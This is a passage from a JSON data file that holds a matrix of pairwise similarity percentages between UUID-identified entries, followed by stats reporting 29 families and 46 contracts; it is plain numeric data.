      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 12.27,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 7.72,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 5.61,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 7.72,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 6.07,
      "0e85fb68-de71-4979-8b8f-80d509029455": 7.72,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 7.39,
      "6e072a16-d906-446f-b860-7f65482e8afc": 6.07,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 8.05,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 7.72,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 7.39,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 6.07,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 7.72,
      "f14c638d-60f5-485e-a303-fff708acd164": 7.85,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 7.72,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 7.72,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 4.09,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 4.09,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 6.07,
      "65de9d63-a252-424b-9399-aedb43b92a53": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 7.39,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 7.72,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 14.32,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 7.39,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 7.72
    },
    "4db0ad68-f3bb-4d54-9219-f27aea042d96": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.34,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.26,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 83.23,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.18,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.2,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 77.45,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.49,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.22,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.34,
      "6e072a16-d906-446f-b860-7f65482e8afc": 98.98,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 45.62,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.31,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.46,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.47,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.49,
      "f14c638d-60f5-485e-a303-fff708acd164": 72.56,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.5,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.49,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 98.81,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 98.98,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.38,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.74,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.39,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.37,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 5.97,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.65,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.44
    },
    "17a2d73d-9f8d-4f33-9a3a-f801735298a1": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.01,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.47,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.39,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.62,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 68.11,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.76,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.47,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.59,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.26,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.71,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 47.04,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.55,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.56,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.38,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.47,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.33,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.47,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.38,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.22,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.34,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.61,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.49,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.37,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.37,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.55
    },
    "05efbd7d-8d96-45fd-b908-f255763e70bd": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 0,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 6.56,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 6.56,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 29.12,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 6.56,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 15.87,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 6.56,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 3.58,
      "0e85fb68-de71-4979-8b8f-80d509029455": 6.56,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 5.97,
      "6e072a16-d906-446f-b860-7f65482e8afc": 3.58,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 29.24,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 6.56,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 5.97,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 3.58,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 6.56,
      "f14c638d-60f5-485e-a303-fff708acd164": 10.14,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 6.56,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 6.56,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 0,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 0,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 3.58,
      "65de9d63-a252-424b-9399-aedb43b92a53": 6.56,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 14.32,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 5.97,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 5.97,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 6.56
    },
    "8645a3c8-b552-480d-b88e-90258459cc4d": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 98.99,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.44,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.13,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.95,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 65.88,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.35,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.49,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.71,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.77,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.1,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 45.05,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.49,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.68,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.29,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.52,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.03,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.65,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.34,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.32,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.43,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.4,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.5,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.39,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.65,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.37,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 5.97,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.2
    },
    "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.14,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.73,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.41,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.8,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.82,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 77.83,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.73,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.38,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.29,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.34,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.37,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.55,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.31,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.31,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.28,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.64,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.43,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.46,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.1,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 98.98,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.71,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.55,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.44,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.55,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.2
    }
  },
  "stats": {
    "total_families": 29,
    "total_contracts": 46
  }
}